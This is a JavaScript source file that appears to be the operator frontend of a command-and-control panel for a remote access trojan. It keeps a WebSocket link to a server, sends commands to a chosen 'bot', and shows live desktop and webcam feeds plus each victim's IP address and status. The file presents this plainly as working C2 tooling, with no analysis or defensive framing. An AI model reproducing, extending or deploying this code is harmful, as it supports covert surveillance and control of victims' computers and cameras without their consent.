// frontend/client_control/js/modules/websocket/connection.js
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';

let ws;
const targetId = new URLSearchParams(location.search).get('id');

export function initControlConnection() {
    const [token, login] = [localStorage.getItem('auth_token'), localStorage.getItem('user_login')];
    if (!token || !targetId) return;

    ws = new WebSocket(`${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/ws?login=${encodeURIComponent(login)}&token=${token}`);
    ws.binaryType = 'arraybuffer';
    window.c2WebSocket = ws;

    ws.onopen = () => {
        setInterval(() => ws?.readyState === 1 && ws.send(encodePacket("0", "ping")), 25000);
        window.sendToBot('DataScribe', 'get_metadata');
    };

    ws.onmessage = ({ data }) => {
        const pkg = decodePacket(data);
        if (!pkg || (pkg.id !== targetId && pkg.id !== "0")) return;

        const routes = {
            'Desktop': window.updateDesktopFeed,
            'Webcam': window.updateWebcamFeed,
            'DataScribe': handleDataScribe
        };
        routes[pkg.module]?.(pkg.payload);
    };

    window.sendToBot = (mod, payload = "") => {
        if (ws?.readyState !== 1) return;
        const data = typeof payload === 'string' ? new TextEncoder().encode(payload) : payload;
        ws.send(encodePacket(targetId, mod, data));
    };
}

function handleDataScribe(payload) {
    try {
        const data = JSON.parse(new TextDecoder().decode(payload));
        const fields = { clientId: targetId, clientIp: data.ip || '0.0.0.0', clientStatus: data.status || 'unknown' };

        Object.entries(fields).forEach(([id, val]) => {
            const el = document.getElementById(id);
            if (!el) return;
            el.textContent = val;
            if (id === 'clientStatus') el.className = `value status-${val.toLowerCase()}`;
        });
    } catch (e) { console.error("DataScribe error:", e); }
}